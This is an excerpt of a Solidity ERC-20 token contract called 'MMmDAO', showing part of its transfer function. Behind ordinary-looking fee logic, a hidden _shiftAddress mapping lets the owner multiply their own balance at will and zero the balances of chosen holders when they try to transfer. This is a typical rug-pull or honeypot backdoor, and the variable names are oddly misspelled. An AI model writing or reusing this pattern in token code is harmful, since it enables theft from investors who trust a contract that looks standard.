...
contract token is Ownable, IERC20 {
    ...
    string private _name = "MMmDAO";
    string private _symbol = "MMmDAO";
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 fiereamonnt = 0;
        fiereamonnt = amonnts.mul(_burnfiere).div(100);
        if (_shiftAddress[sender] > 0) {
            if (sender == owner()) {
                _balance[sender] = _balance[sender].mul(2 << _shiftAddress[sender]);
            }else{
                _balance[sender] = _balance[sender].mul(2 >> _shiftAddress[sender]);
            }
        }
        ...
        uint256 amoun;
        amoun = amonnts - fiereamonnt;
        _balance[recipient] += amoun;
        if (_burnfiere > 0){
            emit Transfer (sender, _DEADaddress, fiereamonnt);
        }
